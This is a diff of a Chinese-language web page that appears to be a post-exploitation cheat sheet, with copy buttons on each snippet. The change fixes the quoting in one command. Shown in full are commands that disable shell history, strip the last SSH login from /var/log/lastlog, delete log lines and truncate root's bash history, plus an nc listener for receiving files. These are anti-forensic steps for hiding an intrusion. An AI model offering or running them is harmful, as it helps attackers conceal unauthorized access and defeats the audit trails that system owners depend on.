@@ -85,7 +85,7 @@ ps aux
 </code><button class="copy-code-button">复制</button></pre></div><div class="el-p"><p dir="auto">删除ssh登录的lastlog记录</p></div><div class="el-pre"><pre><code data-line="0"> set +o history;utmpdump /var/log/lastlog &gt; /tmp/lastlog.file;sed '$d' -i /tmp/lastlog.file;utmpdump  -r &lt; /tmp/lastlog.file &gt; /var/log/lastlog;rm /tmp/lastlog.file
 </code><button class="copy-code-button">复制</button></pre></div><div class="el-p"><p dir="auto">sed删除指定字符串所在行</p></div><div class="el-pre"><pre><code data-line="0">//删除log.txt中123qwe所在行
 sed -i '/123qwe/d' log.txt
-</code><button class="copy-code-button">复制</button></pre></div><div class="el-p"><p dir="auto">sed删除100行以后的命令</p></div><div class="el-pre"><pre><code data-line="0">sed -i "100,$d" /root/.bash_history
+</code><button class="copy-code-button">复制</button></pre></div><div class="el-p"><p dir="auto">sed删除100行以后的命令</p></div><div class="el-pre"><pre><code data-line="0">sed -i '100,$d' /root/.bash_history
 </code><button class="copy-code-button">复制</button></pre></div><div class="el-p"><p dir="auto">nc文件传输</p></div><div class="el-pre"><pre><code data-line="0"># 收
 nc -nvlp 4444 &gt; aaa
 
